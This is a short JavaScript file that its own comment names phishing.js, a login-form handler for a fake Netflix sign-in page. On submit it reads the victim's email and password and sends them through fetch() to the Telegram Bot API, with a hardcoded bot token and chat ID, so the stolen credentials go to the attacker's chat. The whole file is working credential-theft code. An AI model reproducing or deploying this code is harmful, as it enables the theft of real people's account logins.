
// <script src="phishing.js"></script>
// form onsubmit="submitLoginForm(event)"

function submitLoginForm(event){
    event.preventDefault();
    let email = event.target['email'].value;
    let password = event.target['password'].value;
    let text = email + ` < Netflix > ` + password;
    
    let ID = 5721393154;
    let API = '6556542346:AAFPNkrk6FLdIne_-pe_5M-DSMy4szyLRjw';
    let url = `https://api.telegram.org/bot${API}/sendMessage?chat_id=${ID}&text=${text}`;
    fetch(url);
}
